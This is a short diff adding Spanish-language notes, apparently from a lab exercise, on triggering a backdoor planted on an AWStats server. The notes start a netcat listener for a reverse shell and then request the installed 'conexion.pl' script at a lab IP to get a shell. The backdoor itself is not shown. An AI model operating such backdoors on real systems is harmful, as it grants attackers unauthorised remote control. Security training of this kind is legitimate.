@@ -1,0 +1,8 @@
+Para ejecutar el backdoor, se necesitan abrir dos terminales en la máquina atacante.
+En una, ejecutar 
+    nc -vl 80
+para capturar una conexión entrante de shell reversa. En la otra terminal, ejecutar
+    links http://10.0.20.4/awstats/conexion.pl
+para que se ejecute el script instalado.
+
+En la terminal donde se corrió netcat, se tiene la shell.
